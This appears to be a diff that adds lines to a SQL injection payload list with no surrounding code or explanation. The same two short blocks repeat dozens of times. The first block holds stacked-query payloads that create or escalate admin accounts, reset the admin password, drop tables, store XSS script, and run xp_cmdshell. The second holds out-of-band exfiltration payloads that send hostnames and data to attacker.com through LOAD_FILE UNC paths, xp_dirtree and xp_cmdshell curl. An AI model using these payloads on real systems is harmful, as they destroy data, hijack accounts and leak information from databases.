+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
